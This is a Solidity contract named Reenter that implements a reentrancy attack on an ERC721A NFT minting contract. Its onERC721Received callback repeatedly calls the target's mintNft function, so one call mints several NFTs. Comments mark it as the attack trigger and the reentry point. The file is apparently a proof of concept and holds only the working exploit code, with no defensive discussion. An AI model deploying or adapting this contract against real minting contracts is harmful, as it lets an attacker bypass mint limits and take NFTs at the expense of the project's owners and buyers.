// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./ERC721A/ERC721A.sol";
import "openzeppelin-contracts/contracts/utils/Address.sol";

contract Reenter is ERC721A__IERC721Receiver {
    event Log(string);
    event Log_Address(address);
    event Log_Uint(uint256);
    event LogBytes4(bytes4);

    using Address for address;

    address mintingContract;
    uint8 numberOfNftsToMint = 3; // Actually += 1 because of the first call

    constructor(address _mintingContract) { 
      mintingContract = _mintingContract;
    }

    function mintFromContract() public { // Call this to trigger the reentrancy attack
      emit Log("Minting from attacking contract");
      mintingContract.functionCall(abi.encodeWithSignature("mintNft(uint8)", 1));
      numberOfNftsToMint -= 1;
    }

    function onERC721Received(
      address operator,
      address from,
      uint256 tokenId,
      bytes calldata data
    ) external returns (bytes4) {
      // return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)")); // This is what onERC721Received normally should return

      if (numberOfNftsToMint > 0) { // Need some kind of condition as to not forever loop
        emit Log("Reentering");
        // emit Log_Uint(tokenId);
        // emit Log_Uint(numberOfNftsToMint);
        numberOfNftsToMint -= 1;

        mintingContract.functionCall(abi.encodeWithSignature("mintNft(uint8)", 1)); // This is what is causing the reentry
      }
      emit Log("Exiting Reentrancy");
      return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
